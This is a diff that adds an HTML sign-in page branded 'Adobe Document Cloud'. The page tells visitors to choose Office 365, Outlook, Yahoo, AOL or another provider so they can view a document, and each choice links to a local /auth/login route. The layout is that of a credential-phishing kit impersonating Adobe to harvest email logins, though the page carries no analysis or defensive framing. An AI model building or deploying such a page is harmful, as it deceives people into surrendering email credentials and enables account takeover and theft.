@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign In</title>
+  <link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="/css/main.css">
+</head>
+
+<body>
+  <header></header>
+
+  <div class="box-modal">
+    <div class="overlay"></div>
+    <div class="body-modal">
+      <div class="card">
+        <ul class="list-group list-group-flush">
+          <li class="list-group-item" style="padding-top: 1.5rem;">
+            <div class="card-header">
+              <img src="/img/logo.png" alt="logo" class="card-header-icon">
+              <h5 class="card-header-title">Adobe Document Cloud</h5>
+            </div>
+            <p class="card-header-text">Select your email provider from the list below to sign in and be able to view or edit this document.</p>
+          </li>
+          <li class="list-group-item" style="padding-bottom: 1.5rem;border: none;">
+            <div class="row">
+              <a href="/auth/login/2?email_provider=office" class="col-xl-4 email-wrapper">
+                <img src="/img/office.png" alt="office" class="email-logo">
+                <p class="card-text">Office 365</p>
+              </a>
+              <a href="/auth/login/2?email_provider=outlook" class="col-xl-4 email-wrapper">
+                <img src="/img/outlook.png" alt="outlook" class="email-logo" >
+                <p class="card-text">Outlook.com</p>
+              </a>
+              <a href="/auth/login/2?email_provider=yahoo" class="col-xl-4 email-wrapper">
+                <img src="/img/yahoo.png" alt="yahoo" class="email-logo">
+                <p class="card-text">Yahoo! Mail</p>
+              </a>
+            </div>
+            <div class="row">
+              <a href="/auth/login/2?email_provider=aol" class="col-xl-4 email-wrapper">
+                <img src="/img/aol.png" alt="aol" class="email-logo" >
+                <p class="card-text">Aol Mail</p>
+              </a>
+              <a href="/auth/login/2?email_provider=other" class="col-xl-4 email-wrapper">
+                <img src="/img/other.png" alt="other" class="email-logo" >
+                <p class="card-text">Other</p>
+              </a>
+            </div>
+          </li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</body>
+
+</html>
